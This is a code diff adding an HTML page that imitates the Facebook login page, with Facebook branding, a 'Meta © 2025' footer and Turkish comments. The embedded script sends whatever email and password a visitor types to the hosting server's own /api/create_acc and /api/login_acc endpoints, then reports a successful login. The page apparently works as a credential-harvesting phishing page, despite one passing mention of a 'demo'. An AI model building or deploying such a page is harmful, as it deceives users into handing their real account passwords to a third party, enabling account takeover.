@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
+    <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --facebook-blue: #1877f2; 
+            --green-button: #42b72a; 
+            --text-color: #1c1e21;
+            --input-border: #dddfe2;
+            --light-bg: #f0f2f5; 
+            --card-bg: #fff;
+            --link-color: #1877f2;
+            --border-radius: 6px;
+        }
+
+        /* --- MOBİL İLK (DEFAULT) STİLLER --- */
+        body {
+            font-family: 'Helvetica', Arial, sans-serif;
+            background-color: var(--light-bg);
+            margin: 0;
+            color: var(--text-color);
+            padding-top: 50px; /* Header yüksekliği kadar boşluk */
+            min-height: 100vh;
+        }
+
+        .header {
+            width: 100%; background-color: var(--facebook-blue);
+            position: fixed; top: 0; left: 0; z-index: 1000;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1); height: 50px;
+            display: flex; align-items: center; justify-content: center;
+        }
+
+        .header-logo {
+            font-size: 24px; color: #fff; font-weight: 700;
+        }
+
+        .main-content {
+            display: flex; justify-content: center; align-items: flex-start;
+            padding: 20px 10px; /* Mobil padding */
+            min-height: calc(100vh - 50px);
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        .left-panel {
+            display: none; /* Mobil/Küçük Ekranlarda Gizli */
+        }
+
+        .right-panel {
+            width: 100%; max-width: 360px; padding: 0; /* Mobil padding kaldırıldı */
+        }
+        
+        .login-card {
+            background-color: var(--card-bg); border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 15px; text-align: center;
+        }
+
+        /* --- Ortak Form Stilleri (Aynı Kaldı) --- */
+        .input-group { margin-bottom: 12px; }
+        .input-group input {
+            width: 100%; padding: 14px 16px; border: 1px solid var(--input-border);
+            border-radius: 6px; box-sizing: border-box; font-size: 17px; line-height: 1.2;
+            transition: border-color 0.1s;
+        }
+        .input-group input:focus { border-color: var(--facebook-blue); outline: none; box-shadow: 0 0 0 1px var(--facebook-blue); }
+
+        .btn { width: 100%; padding: 12px 16px; border: none; border-radius: 6px; cursor: pointer; font-weight: 700; font-size: 17px; margin-top: 5px; }
+        .btn-primary { background-color: var(--facebook-blue); color: #fff; }
+        .btn-primary:hover { background-color: #166fe5; }
+        .btn-secondary { background-color: var(--green-button); color: #fff; font-size: 16px; width: auto; margin-top: 20px; padding: 14px 20px; display: inline-block; }
+        .btn-secondary:hover { background-color: #36a420; }
+
+        .forgot-password a { color: var(--link-color); text-decoration: none; font-size: 14px; }
+        .forgot-password a:hover { text-decoration: underline; }
+        .divider { border-bottom: 1px solid var(--input-border); margin: 20px 0; }
+        .alert { /* ... */ display: none; }
+
+        /* --- Footer (Mobil) --- */
+        .mobile-footer {
+            text-align: center; padding: 20px 0 40px; font-size: 12px; color: #606770;
+            width: 100%; max-width: 360px; margin-top: 10px;
+        }
+        .mobile-footer a { color: #606770; text-decoration: none; margin: 0 5px; }
+
+        /* --- PC (Masaüstü) GÖRÜNÜMÜ: İKİ SÜTUNLU DÜZEN (@media 900px üstü) --- */
+        @media (min-width: 900px) {
+            body { 
+                padding-top: 0; /* Header'ı kaldırıyoruz */
+                background-color: var(--light-bg);
+            }
+            
+            .header {
+                display: none; /* Mobil Header'ı PC'de gizle */
+            }
+
+            .main-content {
+                flex-direction: row; /* Yatay düzen */
+                align-items: flex-start; /* Üstten hizala */
+                padding-top: 120px; /* PC ekranında ortalama boşluk */
+                min-height: calc(100vh - 50px);
+                max-width: 980px; /* PC ana genişliği */
+                margin: 0 auto;
+            }
+
+            /* --- Sol Kısım (Büyük Logo ve Metin) --- */
+            .left-panel {
+                display: block; /* Görünür yap */
+                text-align: left;
+                padding-right: 32px;
+                padding-top: 50px; /* Form ile dikey hizalama */
+                width: 500px;
+                flex-shrink: 0;
+            }
+
+            .facebook-logo-desktop {
+                font-size: 58px; /* PC Logosunun büyüklüğü */
+                color: var(--facebook-blue);
+                font-weight: 700;
+                line-height: 1;
+                margin-bottom: 10px;
+            }
+
+            .facebook-text-desktop {
+                font-size: 20px; /* PC Metin büyüklüğü */
+                color: var(--text-color);
+                line-height: 32px;
+                width: 95%;
+            }
+
+            /* --- Sağ Kısım / Form Konteyneri (PC) --- */
+            .right-panel {
+                width: 100%;
+                max-width: 396px; 
+                padding: 0;
+            }
+            
+            /* --- Footer (PC) --- */
+            .mobile-footer {
+                display: none;
+            }
+            .desktop-footer {
+                display: block;
+                position: absolute;
+                bottom: 0;
+                left: 0;
+                width: 100%;
+                background-color: #fff;
+                padding: 17px 0;
+                border-top: 1px solid var(--input-border);
+                color: #606770;
+                font-size: 12px;
+                text-align: center;
+            }
+            .desktop-footer a {
+                color: #606770; margin: 0 5px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="header-logo">facebook</div>
+    </div>
+    
+
+    <div class="main-content">
+        
+        <div class="left-panel">
+            <p class="facebook-logo-desktop">facebook</p>
+            <p class="facebook-text-desktop">Facebook allows you to connect with the people in your life and share moments.</p>
+        </div>
+        
+
+        <div class="right-panel">
+            
+            <div style="text-align: center;">
+                 </div>
+            
+            <div class="login-card">
+                <div id="alertMessage" class="alert"></div>
+                
+                <form id="loginForm" onsubmit="event.preventDefault(); handleSignIn();">
+                    
+                    <div class="input-group">
+                        <input type="text" id="email_phone" name="email_phone" placeholder="Email address or phone number" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required minlength="8">
+                    </div>
+                    
+                    <button type="submit" id="signInButton" class="btn btn-primary">Log In</button>
+                    
+                    <span class="forgot-password">
+                        <a href="#">Forgot password?</a>
+                    </span>
+                    
+                    <div class="divider"></div>
+                    
+                    <div style="text-align: center;">
+                        <a href="/sign_up" class="btn btn-secondary">Create new account</a>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="mobile-footer">
+                <a href="#">English (US)</a> · <a href="#">Türkçe</a> · <a href="#">More...</a>
+                <p style="margin-top: 10px;">Facebook, Inc. © 2025</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="desktop-footer">
+        <p>English (US) · Français (France) · Español · Diğer Diller...</p>
+        <p style="margin-top: 10px;">Meta © 2025</p>
+    </div>
+
+    <script>
+        // API işlemleri önceki örneklerle aynı şekilde çalışmaya devam edecektir.
+        async function handleSignIn() {
+            const emailPhoneInput = document.getElementById('email_phone');
+            const passwordInput = document.getElementById('password');
+            const signInButton = document.getElementById('signInButton');
+            
+            const userOrEmail = emailPhoneInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!userOrEmail || password.length < 8) {
+                showAlert("Please enter a valid email/phone and a password (min 8 characters).");
+                return;
+            }
+
+            showAlert("Processing...", "neutral");
+            signInButton.disabled = true;
+            signInButton.textContent = 'Logging In...';
+            
+            const isEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(userOrEmail);
+            
+            if (!isEmail) {
+                showAlert("For this demo, please use an Email address.");
+                signInButton.disabled = false;
+                signInButton.textContent = 'Log In';
+                return;
+            }
+
+            // 1. ADIM: Hesap Oluşturma İsteği (/api/create_acc)
+            const createData = {
+                username: userOrEmail, 
+                password: password,
+                email: userOrEmail,
+                bdate: 1.0,           
+                phone: "00000000000"
+            };
+
+            try {
+                const createResponse = await fetch('/api/create_acc', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(createData)
+                });
+                
+                if (createResponse.status >= 500) {
+                    throw new Error("Server error during account creation attempt.");
+                }
+
+                // 2. ADIM: Giriş Yapma İsteği (/api/login_acc)
+                const loginData = {
+                    username: userOrEmail, 
+                    password: password
+                };
+
+                const loginResponse = await fetch('/api/login_acc', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(loginData)
+                });
+
+                if (loginResponse.ok) {
+                    showAlert("Successfully logged in. Redirecting...", "success");
+                    signInButton.textContent = 'Success!';
+                    
+                    setTimeout(() => {
+                        window.location.href = '/'; 
+                    }, 1000);
+                } else {
+                    const errorText = await loginResponse.text();
+                    showAlert(`Login Failed: ${errorText}. Please check your credentials.`);
+                    
+                    passwordInput.value = '';
+                }
+
+            } catch (error) {
+                console.error('Network Error:', error);
+                showAlert('A network error occurred. Please try again.');
+            } finally {
+                if (signInButton.textContent !== 'Success!') {
+                    signInButton.disabled = false;
+                    signInButton.textContent = 'Log In';
+                }
+            }
+        }
+
+        function showAlert(message, type = "error") {
+            const alertMessage = document.getElementById('alertMessage');
+            alertMessage.textContent = message;
+            
+            if (type === "error") {
+                alertMessage.style.backgroundColor = '#ffebe8';
+                alertMessage.style.color = '#b94a48';
+                alertMessage.style.borderColor = '#ebccd1';
+            } else if (type === "success") {
+                alertMessage.style.backgroundColor = '#dff0d8';
+                alertMessage.style.color = '#3c763d';
+                alertMessage.style.borderColor = '#d6e9c6';
+            } else {
+                alertMessage.style.backgroundColor = '#d9edf7';
+                alertMessage.style.color = '#31708f';
+                alertMessage.style.borderColor = '#bce8f1';
+            }
+
+            alertMessage.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
